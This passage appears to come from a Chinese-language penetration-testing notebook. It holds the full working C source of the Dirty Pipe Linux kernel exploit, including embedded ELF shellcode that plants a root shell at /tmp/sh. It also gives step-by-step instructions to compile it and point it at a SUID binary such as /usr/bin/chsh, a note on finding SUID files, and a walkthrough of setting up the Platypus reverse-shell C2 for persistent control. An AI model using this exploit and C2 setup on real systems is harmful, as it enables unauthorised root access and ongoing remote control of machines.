  0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x3e, 0x00, 0x01, 0x00, 0x00, 0x00,
  0x78, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x38, 0x00, 0x01, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x97, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x97, 0x01, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x48, 0x8d, 0x3d, 0x56, 0x00, 0x00, 0x00, 0x48, 0xc7, 0xc6, 0x41, 0x02,
  0x00, 0x00, 0x48, 0xc7, 0xc0, 0x02, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x48,
  0x89, 0xc7, 0x48, 0x8d, 0x35, 0x44, 0x00, 0x00, 0x00, 0x48, 0xc7, 0xc2,
  0xba, 0x00, 0x00, 0x00, 0x48, 0xc7, 0xc0, 0x01, 0x00, 0x00, 0x00, 0x0f,
  0x05, 0x48, 0xc7, 0xc0, 0x03, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x48, 0x8d,
  0x3d, 0x1c, 0x00, 0x00, 0x00, 0x48, 0xc7, 0xc6, 0xed, 0x09, 0x00, 0x00,
  0x48, 0xc7, 0xc0, 0x5a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x48, 0x31, 0xff,
  0x48, 0xc7, 0xc0, 0x3c, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x2f, 0x74, 0x6d,
  0x70, 0x2f, 0x73, 0x68, 0x00, 0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x3e,
  0x00, 0x01, 0x00, 0x00, 0x00, 0x78, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x38,
  0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00,
  0x00, 0x05, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40,
  0x00, 0x00, 0x00, 0x00, 0x00, 0xba, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0xba, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x31, 0xff, 0x48, 0xc7, 0xc0, 0x69,
  0x00, 0x00, 0x00, 0x0f, 0x05, 0x48, 0x31, 0xff, 0x48, 0xc7, 0xc0, 0x6a,
  0x00, 0x00, 0x00, 0x0f, 0x05, 0x48, 0x8d, 0x3d, 0x1b, 0x00, 0x00, 0x00,
  0x6a, 0x00, 0x48, 0x89, 0xe2, 0x57, 0x48, 0x89, 0xe6, 0x48, 0xc7, 0xc0,
  0x3b, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x48, 0xc7, 0xc0, 0x3c, 0x00, 0x00,
  0x00, 0x0f, 0x05, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00
};

/**
 * Create a pipe where all "bufs" on the pipe_inode_info ring have the
 * PIPE_BUF_FLAG_CAN_MERGE flag set.
 */
static void prepare_pipe(int p[2])
{
  if (pipe(p)) abort();

  const unsigned pipe_size = fcntl(p[1], F_GETPIPE_SZ);
  static char buffer[4096];

  /* fill the pipe completely; each pipe_buffer will now have
     the PIPE_BUF_FLAG_CAN_MERGE flag */
  for (unsigned r = pipe_size; r > 0;) {
    unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
    write(p[1], buffer, n);
    r -= n;
  }

  /* drain the pipe, freeing all pipe_buffer instances (but
     leaving the flags initialized) */
  for (unsigned r = pipe_size; r > 0;) {
    unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
    read(p[0], buffer, n);
    r -= n;
  }

  /* the pipe is now empty, and if somebody adds a new
     pipe_buffer without initializing its "flags", the buffer
     will be mergeable */
}

int hax(char *filename, long offset, uint8_t *data, size_t len) {
  /* open the input file and validate the specified offset */
  const int fd = open(filename, O_RDONLY); // yes, read-only! :-)
  if (fd < 0) {
    perror("open failed");
    return -1;
  }

  struct stat st;
  if (fstat(fd, &st)) {
    perror("stat failed");
    return -1;
  }

  /* create the pipe with all flags initialized with
     PIPE_BUF_FLAG_CAN_MERGE */
  int p[2];
  prepare_pipe(p);

  /* splice one byte from before the specified offset into the
     pipe; this will add a reference to the page cache, but
     since copy_page_to_iter_pipe() does not initialize the
     "flags", PIPE_BUF_FLAG_CAN_MERGE is still set */
  --offset;
  ssize_t nbytes = splice(fd, &offset, p[1], NULL, 1, 0);
  if (nbytes < 0) {
    perror("splice failed");
    return -1;
  }
  if (nbytes == 0) {
    fprintf(stderr, "short splice\n");
    return -1;
  }

  /* the following write will not create a new pipe_buffer, but
     will instead write into the page cache, because of the
     PIPE_BUF_FLAG_CAN_MERGE flag */
  nbytes = write(p[1], data, len);
  if (nbytes < 0) {
    perror("write failed");
    return -1;
  }
  if ((size_t)nbytes < len) {
    fprintf(stderr, "short write\n");
    return -1;
  }

  close(fd);

  return 0;
}

int main(int argc, char **argv) {
  if (argc != 2) {
    fprintf(stderr, "Usage: %s SUID\n", argv[0]);
    return EXIT_FAILURE;
  }

  char *path = argv[1];
  uint8_t *data = elfcode;

  int fd = open(path, O_RDONLY);
  uint8_t *orig_bytes = malloc(sizeof(elfcode));
  lseek(fd, 1, SEEK_SET);
  read(fd, orig_bytes, sizeof(elfcode));
  close(fd);

  printf("[+] hijacking suid binary..\n");
  if (hax(path, 1, elfcode, sizeof(elfcode)) != 0) {
    printf("[~] failed\n");
    return EXIT_FAILURE;
  }

  printf("[+] dropping suid shell..\n");
  system(path);

  printf("[+] restoring suid binary..\n");
  if (hax(path, 1, orig_bytes, sizeof(elfcode)) != 0) {
    printf("[~] failed\n");
    return EXIT_FAILURE;
  }

  printf("[+] popping root shell.. (dont forget to clean up /tmp/sh ;))\n");
  system("/tmp/sh");

  return EXIT_SUCCESS;
}

```
gcc dirty.c -o dirty  编译成dirty文件

然后低权限用户需要找到suid权限文件<br />$ find / -user root -perm /4000 2>/dev/null

找到一个比较合适的，就用来指定一下，就可以成功提权了，不需要覆盖密码什么的<br />$ ./dirty /usr/bin/chsh   <br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1647064739351-77548276-bf81-4b6d-9fbf-fb2372a390dd.png#clientId=ub2b2bbc8-7500-4&from=paste&height=138&id=ud217d0ea&originHeight=184&originWidth=544&originalType=binary&ratio=1&rotation=0&showTitle=false&size=65564&status=done&style=none&taskId=u9e7abeed-d519-4923-ae24-ceb198369f8&title=&width=408)

<a name="VQiKu"></a>
#### suid提权
find / -perm -u=s -type f 2>/dev/null 找到存在suid权限的文件<br />[https://www.anquanke.com/post/id/86979](https://www.anquanke.com/post/id/86979)<br />例如：<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1639617340298-7ccb67bf-fdde-4ccd-b2d6-d6ce481ae91b.png#clientId=u780eeea1-3161-4&from=paste&height=299&id=mtt0Q&originHeight=454&originWidth=802&originalType=binary&ratio=1&rotation=0&showTitle=false&size=57126&status=done&style=none&taskId=u44dfb99c-dd3e-4cbe-af19-a7247447df5&title=&width=529)

<a name="sUSul"></a>
### linux权限后台管理(linux的C2
[https://github.com/WangYihang/Platypus](https://github.com/WangYihang/Platypus)

修改config.yaml配置host和port的监听，这里配置的port是web访问的界面<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1648829350207-d20c4b9f-419c-431a-8ec1-c6b86dfecf55.png#clientId=u39445cb0-001c-4&from=paste&height=128&id=ucb524eb5&originHeight=170&originWidth=594&originalType=binary&ratio=1&rotation=0&showTitle=false&size=15426&status=done&style=none&taskId=ue66f3cc5-dd73-4bb9-bf63-0fe7e492475&title=&width=446)

![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1648829971690-a7b55f46-2b84-4afb-b533-ce64a38efe9e.png#clientId=u39445cb0-001c-4&from=paste&height=362&id=u30fb457e&originHeight=483&originWidth=1543&originalType=binary&ratio=1&rotation=0&showTitle=false&size=60142&status=done&style=none&taskId=u7de478c5-095b-49ef-8131-b97a6806c23&title=&width=1157)

![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1648829980336-9307cf3d-f542-45a8-a306-5cf97c3022c8.png#clientId=u39445cb0-001c-4&from=paste&height=118&id=u8eb0a809&originHeight=157&originWidth=678&originalType=binary&ratio=1&rotation=0&showTitle=false&size=69611&status=done&style=none&taskId=u01a4f771-fa88-4fbd-bcba-7e3fb365d95&title=&width=509)<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1648829996981-96b0cecd-5488-401a-b23f-f210e61fecc2.png#clientId=u39445cb0-001c-4&from=paste&height=638&id=ue1da1af3&originHeight=851&originWidth=1893&originalType=binary&ratio=1&rotation=0&showTitle=false&size=94361&status=done&style=none&taskId=u9472757a-127b-4c5a-892e-f0f439d2655&title=&width=1420)<br />很牛逼的是，删除了进程，居然还能连着shell ，仔细一看，原来其实监听了多个bash的进程，所以删掉最明显的，依然还有shell管理着<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1648830419634-a227f889-3675-4339-b35e-1aad11a724a9.png#clientId=u39445cb0-001c-4&from=paste&height=637&id=ubd540d72&originHeight=850&originWidth=1023&originalType=binary&ratio=1&rotation=0&showTitle=false&size=151515&status=done&style=none&taskId=u1f13b232-17ab-446f-b571-5b3789af37f&title=&width=767)

但是毕竟端口是不需要密码就能访问的，所以设置白名单访问会好一点，**记得设置防火墙白名单访问！！！**

